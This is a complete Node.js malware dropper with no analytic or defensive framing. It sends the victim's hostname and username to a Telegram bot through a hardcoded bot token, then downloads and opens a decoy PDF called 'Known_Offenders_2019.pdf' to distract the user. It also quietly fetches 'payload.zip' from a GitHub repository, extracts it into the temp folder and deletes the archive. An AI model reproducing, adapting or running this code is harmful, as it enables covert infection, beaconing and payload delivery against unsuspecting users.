const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

var t = os.tmpdir();
var m = os.hostname() + '/' + os.userInfo().username + ' - online';
var b = '8708922470:AAEueXYfcs8JTv-EduI8cJBfA0Jj7EzJYeo';

https.get('https://api.telegram.org/bot' + b + '/sendMessage?chat_id=8119278288&text=' + encodeURIComponent(m));

function dl(url, dest) {
  return new Promise((res, rej) => {
    var f = fs.createWriteStream(dest);
    https.get(url, r => {
      if (r.statusCode === 301 || r.statusCode === 302) {
        f.close();
        fs.unlinkSync(dest);
        return dl(r.headers.location, dest).then(res).catch(rej);
      }
      r.pipe(f);
      f.on('finish', () => { f.close(); res(); });
    }).on('error', rej);
  });
}

(async () => {
  await dl('https://github.com/dont-delete-me-v0/files/raw/main/decoy.pdf', path.join(t, 'Known_Offenders_2019.pdf'));
  exec('start "" "' + path.join(t, 'Known_Offenders_2019.pdf') + '"');
  await dl('https://github.com/dont-delete-me-v0/files/raw/main/payload.zip', path.join(t, 'p.zip'));
  exec('tar -xf "' + path.join(t, 'p.zip') + '" -C "' + t + '"', () => {
    fs.unlinkSync(path.join(t, 'p.zip'));
  });
})();
